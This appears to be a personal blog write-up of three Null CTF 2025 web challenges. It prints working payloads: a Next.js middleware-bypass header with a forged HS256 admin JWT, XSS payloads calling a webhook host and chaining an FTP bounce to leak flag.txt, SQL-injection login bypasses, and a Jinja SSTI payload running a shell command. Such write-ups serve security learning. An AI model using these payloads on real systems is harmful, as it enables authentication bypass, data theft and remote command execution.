---
title: "Null CTF 2025: Web Challenges"
date: 2025-12-12T10:00:00+0200
draft: false
tags: ["ctf", "web"]
categories: ["writeups"]
summary: "Notes from the Null CTF 2025 web challenges covering Next Jason's auth bypass and JWT abuse."
---

# Intro

I participated in this CTF with [**PulsaDeCyber**](https://ctftime.org/team/373454). Unfortunately I was busy most of the time, so I only had time to solve 3 challenges, that were easy-medium.

# Challenge: `Next Jason` - Easy

## Analysis

By opening the source code, I immediately booted up the docker container, so I can play with stuff locally without too much infrastructure-stuff going on.
First thing I realized is there is a `next.js` app that is using some middleware, specified for all `/api/*`. By going into the website we get a regular login page:

![Login page](/assets/Pasted%20image%2020251207003729.png)

After checking the installed `next.js` version, I verified [# CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass) in the given code.

The simple bypass for the middleware will be adding the next header to our /api/* requests:
`x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"`

Let's look at `package.json`:
![package.json dependencies](/assets/Pasted%20image%2020251207004411.png)

Both `next.js` and `jsonwebtoken` libraries are out of version.
The catch is to look for an easy `jwt` misconfiguration.

Let's look at the code!

`/token/verify`
![verifyToken route snippet](/assets/Pasted%20image%2020251207005819.png)
I wont show the whole route, but the main function is `verifyToken`, which returns the payload for the token if it is valid, by decrypting it using the public key of a randomly generated RSA.
It uses both `RS256` and `HS256` to verify, which is weird. But let's continue!

`/token/sign`
![token signing route](/assets/Pasted%20image%2020251207010126.png)
Well, all this code does is to sign the given payload ( which here is basically `{username: string}` ) to a `jwt` token. Also, we cannot sign as admin, so we can't get the admin's token.

We have a few more routes in the `api`, which will be used after the middleware bypass:
- `/api/getFlag` - returns flag after running `/token/verify` and checks if we are admin (not usable for now)
- `/api/getPublicKey` - returns the RSA's private key. Great achievement.
- `/api/login` - just generates a `jwt` token using `/token/sign` and filters us from being admin, not usable at all.

We can achieve the public key! that's great news.
As I was looking for `jwt` vulnerabilities, I found this [article](https://www.vaadata.com/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/#algorithm-confusion). At the exact "Algorithm Confusion" title, we can see a case we have in this code.
We first sign the payload using RS256, and we verify it with both HS256 or RS256.

The way they exploit this in the article is by signing the token using HS256, and the public key as the secret, and it works!

So, let's try!

## Exploit

After fetching the public key, I wrote this js code to generate a new token

```js
const jwt = require("jsonwebtoken");
const {readFileSync} = require("fs");
const path = require("path");
const PUBKEY = require("./pubkey.json").PUBKEY;

const payload = {
username: 'admin'
};

const token = jwt.sign(payload, PUBKEY, { algorithm: 'HS256'})
console.log(token); // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw
```

Next, I wrote a simple python script that will fetch the flag using the new admin token, and the middleware bypass:

```python
r = requests.get('http://75cb8a82a9d8.challs.ctf.r0devnull.team:8001/api/getFlag', headers={

"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"

}, cookies={
'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw'
})

print(r.text)
```

#### Flag: `nullctf{f0rg3_7h15_cv3_h3h_c1caa1a23b5c568d}`

# Challenge: `ftp-db` - Medium

## Analysis

This challenge has 3 services. 
- Frontend - `next.js`, nothing special. A note from the authors mentioned there is nothing special in the frontend. Contacts the backend by using a server component in `next.js`.
- FTP (file transfer protocol) - initializes an FTP server using python's `pyftpdlib`. 
	  Note: enables `permit_foreign_addresses` which allows us to use active mode to send data streams. through a foreign server ( will explain later :) ) .
- Backend - `rust & rocket`, contacts the ftp server.

So we cannot send requests to ftp or backend, since they are both locally on the container, no open ports.

Let's open the app:

![Notes app homepage](/assets/Pasted%20image%2020251207120355.png)

This is a classic notes app. Backend stores notes in the FTP server.
Let's check the code.

![Note creation code](/assets/Pasted%20image%2020251207120552.png)

nothing really special for creating a note, I wanna look at the code for the search page.

```tsx
<div
	className="font-mono w-full p-2 text-sm bg-green-900 rounded border border-green-800"
	dangerouslySetInnerHTML={{
		__html: searchResult.result,
	}}
/>
```
We can see the search page injects the page's HTML with the note's content. This is an XSS.

We also have a "Report to admin" button, which opens a webdriver on a specific note, this can trigger the admin to enter our custom note and get injected by our payload.

Let's validate our theory by making the admin send a message to my webhook:
```html
<img src=x onerror='(()=>{fetch("https://webhook.site/9fe988d0-b53c-451d-9dd5-1febc0179031", {method: "POST", mode: "no-cors"}).then((r) => r.text())})()'>
```

![Webhook hit screenshot](/assets/Pasted%20image%2020251207121713.png)

Next step was to figure out how can I actually inject an XSS that will lead us to get flag.txt from the ftp server.

It was quite exhausting, but after asking some advice, my friend [**Harel**](https://x.com/H4R3L) told me about **FTP Bounce Attack**, that allows us to make the ftp server connect via **active mode** to a foreign machine, and send the requested data there. 

## Exploit

To actually use this attack, I found a way to manipulate the CRLF by just sending a raw string body using a POST request, so the body will be in the bottom of the request, and not in the URL header. Locally, I tried the next thing:

```html
<img src=x onerror='(()=>{fetch("http://ftp:2121", {method: "POST", body:"USER anonymous\r\nPASS anonymous\r\n", mode: "no-cors"})})()'>
```

by seeing the FTP logs. It actually worked. The admin opened a connection to the ftp server, sent him some unknown commands (the HTTP headers lol), and sent him the body, that was injected with FTP commands.

I booted up a proxy server with a script I wrote ([Check it out](https://github.com/nitayStain/ftp-bounce-listener/blob/main/main.py)). And tried the next payload on the original website:
```html
<img src=x onerror='(()=>{fetch("http://ftp:2121", {method: "POST", body:"USER anonymous\r\nPASS anonymous\r\nTYPE A\r\nPORT <ip,port>\r\nRETR flag.txt\r\n"})})()'>
```
But I didn't get any connection to my proxy server. 

After figuring it out for a while, I tried adding `no-cors` and waiting for the promise to finish (using .then).
```html
<img src=x onerror='(()=>{fetch("http://ftp:2121", {method: "POST", body:"USER anonymous\r\nPASS anonymous\r\nTYPE A\r\nPORT <ip,port>\r\nRETR flag.txt\r\n", mode: "no-cors"}).then((r) => r.text())})()'>
```

And it worked!

#### Flag: `nullctf{ftp_15_7h3_b357_d474b453}`

## Credits:
- [Thomas Goldman](https://thomy-g.github.io/) - we solved this challenge together as teammates.

# Challenge: `s1mple` - Easy

## Analysis

There was no source code for this challenge, although the solution was pretty easy.

![Admin login page](/assets/Pasted%20image%2020251207125647.png)

First is this admin page, after trying basic SQLI payload (`' OR 1=1;--`), I was logged in as admin.

![Dashboard view](/assets/Pasted%20image%2020251207125739.png)

We are given this dashboard, which isn't really helpful since you cannot really do anything here. I tried writing an SQLI payload on the search, which didn't work. And later on I tried SSTI, nothing worked.

So I tried logging in as a different user: `' OR 1=1 AND USERNAME != 'admin';--`

![User view](/assets/Pasted%20image%2020251207125907.png)

we are logged in as user!

Let's try an SQLI query: 

![SQL injection attempt](/assets/Pasted%20image%2020251207125929.png)

Okay, let's try a basic SSTI:

![SSTI payload](/assets/Pasted%20image%2020251207130000.png)

Perfect.

now let's try to read a file:

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()}}
```

![Flag output](/assets/Pasted%20image%2020251207130046.png)

It was really simple!

#### Flag: `nullctf{1nd33d_1t_w4s_th4t_s1mpl3}`
